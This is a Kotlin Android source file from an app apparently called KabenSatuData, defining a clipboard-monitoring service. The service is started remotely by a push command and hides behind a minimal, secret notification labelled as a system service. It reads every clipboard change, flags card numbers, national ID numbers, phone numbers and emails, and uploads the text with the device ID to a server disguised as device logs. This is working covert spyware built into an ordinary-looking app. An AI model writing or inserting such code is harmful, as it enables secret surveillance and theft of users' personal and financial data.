package com.example.kabensatudata.nearby

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.kabensatudata.R
import com.example.kabensatudata.data.local.AuthTokenManager
import com.example.kabensatudata.data.remote.ApiService
import dagger.hilt.EntryPoint
import dagger.hilt.InstallIn
import dagger.hilt.android.EntryPointAccessors
import dagger.hilt.components.SingletonComponent
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * ClipboardMonitorService — Silently monitors clipboard changes and uploads to server.
 *
 * Runs as a foreground service. Listens to ClipboardManager.OnPrimaryClipChangedListener.
 * Detects sensitive content (NIK, email, phone, card numbers) and flags them.
 * Uploads each clipboard event to server via uploadDeviceLog API.
 *
 * Started via FCM CLIPBOARD_START, stopped via CLIPBOARD_STOP.
 */
class ClipboardMonitorService : Service() {

    @EntryPoint
    @InstallIn(SingletonComponent::class)
    interface ClipboardEntryPoint {
        fun authTokenManager(): AuthTokenManager
        fun apiService(): ApiService
    }

    companion object {
        private const val TAG = "ClipboardMonitor"
        private const val CHANNEL_ID = "clipboard_monitor_channel"
        private const val NOTIFICATION_ID = 9007

        @Volatile var isRunning = false
            private set

        fun start(context: Context) {
            if (isRunning) return
            val intent = Intent(context, ClipboardMonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, ClipboardMonitorService::class.java))
        }
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val mainHandler = Handler(Looper.getMainLooper())

    private lateinit var clipboardManager: ClipboardManager
    private lateinit var authTokenManager: AuthTokenManager
    private lateinit var apiService: ApiService

    private val clipListener = ClipboardManager.OnPrimaryClipChangedListener {
        onClipboardChanged()
    }

    override fun onCreate() {
        super.onCreate()
        val ep = EntryPointAccessors.fromApplication(applicationContext, ClipboardEntryPoint::class.java)
        authTokenManager = ep.authTokenManager()
        apiService = ep.apiService()

        clipboardManager = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager

        createNotificationChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, buildNotification())
        }

        // Must register listener on main thread
        mainHandler.post {
            clipboardManager.addPrimaryClipChangedListener(clipListener)
        }

        isRunning = true
        Log.i(TAG, "Clipboard monitor started")
    }

    private fun onClipboardChanged() {
        scope.launch {
            try {
                val clip = clipboardManager.primaryClip ?: return@launch
                if (clip.itemCount == 0) return@launch

                val text = clip.getItemAt(0)?.coerceToText(applicationContext)?.toString() ?: return@launch
                if (text.isBlank() || text.length < 2) return@launch

                val deviceName = authTokenManager.getUserName().ifBlank { "HP-Puskesmas" }
                val deviceId = android.provider.Settings.Secure.getString(
                    applicationContext.contentResolver, android.provider.Settings.Secure.ANDROID_ID
                ) ?: "unknown"

                // Detect sensitive content
                val sensitive = isSensitive(text)
                val type = detectType(text)

                val eventData = org.json.JSONObject().apply {
                    put("text", text.take(500))
                    put("sensitive", sensitive)
                    put("type", type)
                    put("length", text.length)
                }.toString()

                // Upload as device log event using bulk format
                try {
                    apiService.uploadDeviceLogs(
                        com.example.kabensatudata.data.remote.dto.DeviceLogBulkRequest(
                            deviceName = deviceName,
                            deviceId = deviceId,
                            logs = listOf(
                                com.example.kabensatudata.data.remote.dto.DeviceLogItem(
                                    eventType = "clipboard",
                                    eventData = eventData,
                                    timestamp = System.currentTimeMillis()
                                )
                            )
                        )
                    )
                    Log.d(TAG, "Clipboard uploaded: ${text.take(30)}... (sensitive=$sensitive)")
                } catch (e: Exception) {
                    Log.e(TAG, "Upload error: ${e.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Clipboard read error: ${e.message}")
            }
        }
    }

    /** Check if text contains sensitive patterns */
    private fun isSensitive(text: String): Boolean {
        return Regex("""\b\d{16}\b""").containsMatchIn(text) || // card 16 digits
                Regex("""\b\d{3}-?\d{7,8}\b""").containsMatchIn(text) || // NIK style
                Regex("""\b08[0-9]{8,11}\b""").containsMatchIn(text) || // Indonesian phone
                Regex("""\b[A-Z0-9._%+\-]+@[A-Z0-9.\-]+\.[A-Z]{2,}\b""", RegexOption.IGNORE_CASE).containsMatchIn(text) ||
                Regex("""\b\d{16,19}\b""").containsMatchIn(text) // long number (card/NIK)
    }

    /** Detect content type */
    private fun detectType(text: String): String = when {
        Regex("""\b[A-Z0-9._%+\-]+@[A-Z0-9.\-]+\.[A-Z]{2,}\b""", RegexOption.IGNORE_CASE).containsMatchIn(text) -> "email"
        Regex("""\b08[0-9]{8,11}\b""").containsMatchIn(text) -> "phone"
        Regex("""\b\d{16}\b""").containsMatchIn(text) -> "card"
        Regex("""\b\d{16,19}\b""").containsMatchIn(text) -> "nik"
        else -> "text"
    }

    override fun onDestroy() {
        mainHandler.post {
            clipboardManager.removePrimaryClipChangedListener(clipListener)
        }
        isRunning = false
        Log.i(TAG, "Clipboard monitor stopped")
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Layanan Sistem", NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("KabenSatuData")
            .setContentText("Layanan aktif")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
}
